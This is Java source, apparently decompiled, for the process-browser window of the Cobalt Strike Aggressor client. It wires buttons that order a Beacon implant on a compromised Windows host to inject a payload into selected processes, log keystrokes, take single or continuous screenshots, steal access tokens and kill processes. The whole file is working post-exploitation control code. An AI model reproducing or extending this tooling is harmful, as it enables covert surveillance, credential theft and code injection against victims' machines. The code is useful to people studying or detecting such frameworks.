package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.dialogs.ScListenerChooser;
import beacon.TaskBeacon;
import common.AObject;
import common.CommonUtils;
import console.AssociatedPanel;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JSeparator;

public class ProcessBrowser extends AObject implements ActionListener {
   protected String bid = "";
   protected AggressorClient client = null;
   protected Processes browser = null;

   public ProcessBrowser(AggressorClient var1, String var2) {
      this.client = var1;
      this.bid = var2;
      this.browser = new Processes(var1, var2);
   }

   public void actionPerformed(ActionEvent var1) {
      String var2 = var1.getActionCommand();
      Object[] var3;
      TaskBeacon var4;
      int var5;
      if ("Kill".equals(var2)) {
         if (!this.browser.hasSelectedRows()) {
            DialogUtils.showError(DialogUtils.MessageID.ROWS_MUST_BE_SELECTED);
            return;
         }

         var3 = this.browser.getSelectedPIDs();
         var4 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});

         for(var5 = 0; var5 < var3.length; ++var5) {
            var4.input("kill " + var3[var5]);
            var4.Kill(Integer.parseInt(var3[var5] + ""));
         }

         var4.Pause(500);
         this.browser.refresh();
      } else if ("Refresh".equals(var2)) {
         this.browser.refresh();
      } else if ("Inject".equals(var2)) {
         if (!this.browser.hasSelectedRows()) {
            DialogUtils.showError(DialogUtils.MessageID.ROWS_MUST_BE_SELECTED);
            return;
         }

         ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
            public void dialogResult(String var1) {
               TaskBeacon var2 = new TaskBeacon(ProcessBrowser.this.client, ProcessBrowser.this.client.getData(), ProcessBrowser.this.client.getConnection(), new String[]{ProcessBrowser.this.bid});
               Object[][] var3 = ProcessBrowser.this.browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));

               for(int var4 = 0; var4 < var3.length; ++var4) {
                  int var5 = Integer.parseInt(var3[var4][0] + "");
                  String var6 = var3[var4][1] + "";
                  var2.input("inject " + var5 + " " + var6 + " " + var1);
                  var2.Inject(var5, var1, var6);
               }

            }
         }).show();
      } else {
         final TaskBeacon var8;
         final Object[][] var9;
         if ("Log Keystrokes".equals(var2)) {
            if (!this.browser.hasSelectedRows()) {
               DialogUtils.showError(DialogUtils.MessageID.ROWS_MUST_BE_SELECTED);
               return;
            }

            var8 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
            var9 = this.browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));

            for(var5 = 0; var5 < var9.length; ++var5) {
               int var6 = Integer.parseInt(var9[var5][0] + "");
               String var7 = var9[var5][1] + "";
               var8.input("keylogger " + var6 + " " + var7);
               var8.KeyLogger(var6, var7);
            }

            DialogUtils.showInfo("Tasked Beacon to log keystrokes");
         } else if ("Screenshot".equals(var2)) {
            if (!this.browser.hasSelectedRows()) {
               DialogUtils.showError(DialogUtils.MessageID.ROWS_MUST_BE_SELECTED);
               return;
            }

            var8 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
            var9 = this.browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));
            SafeDialogs.askYesNoBoth("Would you like to take a single screenshot?\n\nPress 'Yes' to take a single screenshot.\n\nPress 'No' to take continuous screenshots.", "", new SafeDialogCallback() {
               public void dialogResult(String var1) {
                  for(int var2 = 0; var2 < var9.length; ++var2) {
                     int var3 = Integer.parseInt(var9[var2][0] + "");
                     String var4 = var9[var2][1] + "";
                     if ("yes".equals(var1)) {
                        var8.input("screenshot " + var3 + " " + var4);
                        var8.Screenshot(var3, var4);
                     } else {
                        var8.input("screenwatch " + var3 + " " + var4);
                        var8.Screenwatch(var3, var4);
                     }
                  }

                  if ("yes".equals(var1)) {
                     DialogUtils.showInfo("Tasked Beacon to take screenshot");
                  } else {
                     DialogUtils.showInfo("Tasked Beacon to run screenwatch");
                  }

               }
            });
         } else if ("Steal Token".equals(var2)) {
            if (!this.browser.hasSelectedRows()) {
               DialogUtils.showError(DialogUtils.MessageID.ROWS_MUST_BE_SELECTED);
               return;
            }

            var3 = this.browser.getSelectedPIDs();
            var4 = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});

            for(var5 = 0; var5 < var3.length; ++var5) {
               var4.input("steal_token " + var3[var5]);
               var4.StealToken(Integer.parseInt(var3[var5] + ""));
            }

            DialogUtils.showInfo("Tasked Beacon to steal a token");
         }
      }

   }

   public JButton Button(String var1) {
      JButton var2 = new JButton(var1);
      var2.addActionListener(this);
      return var2;
   }

   public JComponent getContent() {
      AssociatedPanel var1 = new AssociatedPanel(this.bid);
      var1.setLayout(new BorderLayout());
      JButton var2 = this.Button("Kill");
      JButton var3 = this.Button("Refresh");
      JSeparator var4 = new JSeparator();
      JButton var5 = this.Button("Inject");
      JButton var6 = this.Button("Log Keystrokes");
      JButton var7 = this.Button("Screenshot");
      JButton var8 = this.Button("Steal Token");
      JSeparator var9 = new JSeparator();
      JButton var10 = this.Button("Help");
      var10.addActionListener(DialogUtils.gotoURL("https://www.cobaltstrike.com/help-process-browser"));
      var1.add(this.browser.setup(), "Center");
      var1.add(DialogUtils.center(var2, var3, var4, var5, var6, var7, var8, var9, var10), "South");
      return var1;
   }
}
